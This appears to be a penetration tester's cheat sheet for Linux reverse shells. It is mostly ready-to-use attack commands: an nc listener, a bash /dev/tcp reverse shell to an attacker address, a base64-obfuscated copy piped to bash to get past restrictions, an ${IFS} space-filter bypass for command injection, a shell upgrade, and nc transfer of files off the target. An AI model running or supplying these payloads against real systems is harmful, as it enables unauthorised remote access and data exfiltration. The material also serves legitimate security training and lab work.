# Linux Shells

All things linux shells

## Basic Reverse Shell

### Start Listener

```bash
rlwrap -crA nc -lvnp 9001
```

**Note:** Prepending `rlwrap` provides a more user-friendly shell experience

### Launch Connection

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/$IP/9001 0>&1
```

**Note:** Try different payloads from [RevShells](https://www.revshells.com) if a simple bash one doesn't work

```bash
# Base64 encode if necessary (can potentially allow us to bypass certain restrictions)
echo 'bash -i >& /dev/tcp/192.168.1.10/9001 0>&1' | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvOTAwMSAwPiYxCg==
```

We can now use the following payload:

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvOTAwMSAwPiYxCg==' | base64 -d | bash
```

### Upgrade Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
ENTER
export TERM=xterm
```

**Note:** `export TERM=xterm` allows you clear screen with `ctrl+l`

### Filter Bypass

```bash
# Space filters, replacing spaces with `${IFS}` (possibly `${IFS%??}` if that doesn't work)
echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvOTAwMSAwPiYxCg=='${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
```

### Download files

```bash
# On kali
nc -lvnp 1234 > example.txt

# On target
nc 192.168.1.10 1234 < example.txt
```
